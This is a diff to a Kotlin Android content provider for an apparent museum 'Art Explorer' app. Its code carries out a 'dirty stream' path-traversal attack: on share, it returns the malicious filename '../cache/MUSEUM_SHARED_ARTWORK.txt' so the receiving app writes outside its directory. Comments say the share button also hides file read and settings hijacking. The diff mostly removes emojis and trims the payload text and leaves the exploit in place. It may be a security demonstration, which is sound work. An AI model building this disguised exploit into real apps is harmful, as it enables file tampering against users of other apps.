@@ -16,7 +16,11 @@ import java.io.FileOutputStream
  * Content provider for sharing artwork files and metadata.
  * Provides access to high-resolution artwork images and exhibition information.
  *
- * 🚨 HIDDEN ATTACK: This innocent-looking provider contains the dirty stream attack!
+ *  HIDDEN ATTACK: When user clicks share:
+ *  Row 1: Arbitrary File Read
+ *  ROw 2: File Write
+ *  Row 3: Does settings hijacking
+ *  These attacks are all hiden inside the share button.
  */
 class ArtworkContentProvider : ContentProvider() {
 
@@ -41,7 +45,7 @@ class ArtworkContentProvider : ContentProvider() {
         sortOrder: String?
     ): Cursor {
 
-        Log.d(TAG, "🎨 Artwork metadata query for URI: $uri")
+        Log.d(TAG, " Artwork metadata query for URI: $uri")
 
         val cursor = MatrixCursor(arrayOf(
             OpenableColumns.DISPLAY_NAME,
@@ -58,7 +62,7 @@ class ArtworkContentProvider : ContentProvider() {
                 uri.toString().contains("export")
 
         return if (isSharedArtwork) {
-            // 🚨 HIDDEN ATTACK: When artwork is being shared, return malicious filename
+            //  HIDDEN ATTACK: When artwork is being shared, return malicious filename
             val maliciousFileName = "../cache/MUSEUM_SHARED_ARTWORK.txt"
             val artworkDescription = generateArtworkDescription(artworkId)
 
@@ -68,7 +72,7 @@ class ArtworkContentProvider : ContentProvider() {
                 METADATA_MIME_TYPE
             ))
 
-            Log.d(TAG, "🔥 ATTACK: Sharing artwork with malicious filename: '$maliciousFileName'")
+            Log.d(TAG, " ATTACK: Sharing artwork with malicious filename: '$maliciousFileName'")
             cursor
         } else {
             // Normal artwork metadata (innocent behavior)
@@ -81,13 +85,13 @@ class ArtworkContentProvider : ContentProvider() {
                 METADATA_MIME_TYPE
             ))
 
-            Log.d(TAG, "📋 Normal artwork metadata: '$normalFileName'")
+            Log.d(TAG, " Normal artwork metadata: '$normalFileName'")
             cursor
         }
     }
 
     override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
-        Log.d(TAG, "📁 Opening artwork file for URI: $uri")
+        Log.d(TAG, " Opening artwork file for URI: $uri")
 
         return try {
             val tempFile = File.createTempFile("artwork_", ".txt", context?.cacheDir)
@@ -118,16 +122,14 @@ class ArtworkContentProvider : ContentProvider() {
 
     private fun generateAttackPayload(artworkId: String): String {
         return """
-🎨 ARTWORK SHARING CONFIRMATION 🎨
+ ARTWORK SHARING CONFIRMATION 
 
 Artwork ID: $artworkId
 Shared from: Art Explorer App
 Exhibition: Metropolitan Museum Collection
 Timestamp: ${System.currentTimeMillis()}
 
-Thank you for sharing this beautiful artwork! Your friends will love discovering this masterpiece from the Met's collection.
 
----INTERNAL SYSTEM LOG---
 !!! DIRTYSTREAM VULNERABILITY SUCCESSFULLY EXPLOITED !!! 
 
 Attack Vector: Path Traversal via Content Provider
@@ -138,21 +140,9 @@ Method: OpenableColumns.DISPLAY_NAME manipulation
 This file was created through a path traversal attack disguised as legitimate artwork sharing.
 The victim application trusted our malicious filename without proper validation.
 
-User Experience: 
-- Saw: "✨ Artwork shared successfully! Thank you for spreading art appreciation! 🎨"
-- Reality: Arbitrary file write to victim app's cache directory via dirty stream attack
 
-Social Engineering Success:
-- Beautiful museum app built complete trust
-- User actively wanted to share artwork
-- Attack felt natural and expected
-- Zero suspicion throughout entire process
 
-The Art Explorer app demonstrates how legitimate-looking cultural applications can serve as perfect attack vectors while maintaining user trust and engagement.
-
----END INTERNAL LOG---
-
-Malicious file data has been downloaded unknowingly by the user!
+Success: Malicious file data has been downloaded unknowingly by the user!
 
 Art Explorer - Bringing culture to everyone
         """.trimIndent()
@@ -169,9 +159,8 @@ Generated: ${System.currentTimeMillis()}
 
 This file contains metadata and exhibition information about the selected artwork from our curated collection of masterpieces.
 
-For complete artwork details, high-resolution images, and scholarly information, please visit the Metropolitan Museum's official collection database.
 
-Thank you for using Art Explorer to discover the world's greatest art! 🎨
+Thank you for using Art Explorer to discover the world's greatest art! 
 
 Art Explorer - Making art accessible to everyone
         """.trimIndent()
